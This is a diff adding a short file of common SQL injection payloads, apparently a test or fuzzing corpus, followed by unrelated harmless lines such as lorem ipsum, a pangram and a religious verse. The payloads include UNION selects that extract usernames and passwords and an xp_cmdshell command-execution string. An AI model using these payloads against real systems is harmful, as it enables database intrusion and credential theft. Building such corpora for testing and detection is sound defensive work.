@@ -1,0 +1,21 @@
+' OR 1=1 --
+' AND 1=2 --
+' UNION SELECT username, password FROM users --
+' OR EXISTS(SELECT * FROM users WHERE username = 'admin') --
+' UNION SELECT 1, CONCAT(username, ':', password) FROM users --
+' AND 1=CONVERT(int, (SELECT @@version)) --
+' OR (SELECT COUNT(*) FROM users WHERE username = 'admin') > 0 --
+' OR 1=1 UNION SELECT 1, 2, HEX(username), HEX(password) FROM users --
+' UNION SELECT 1, 2, TO_BASE64(username), TO_BASE64(password) FROM users --
+' OR 1=1; EXEC xp_cmdshell('nslookup example.com') --
+%27%20OR%201%3D1%20--
+' OR 1 LIKE 'a%' --
+
+
+Lorem ipsum dolor sit amet, consectetur adipiscing elit. Proin quis tincidunt erat. Sed id leo et eros ullamcorper posuere.
+In a world of rapidly changing technology, staying ahead of the curve is more crucial than ever before.
+Coded in the depths of the night, this algorithm promises both efficiency and precision, navigating the maze of data.
+The quick brown fox jumps over the lazy dog.
+Sometimes the hardest decisions we face in life come down to choosing between two equally good things.
+Bananas are rich in potassium and can help maintain healthy heart function.
+Indeed, my prayer, my rites of sacrifice, my living and my dying are for Allah, Lord of the worlds.
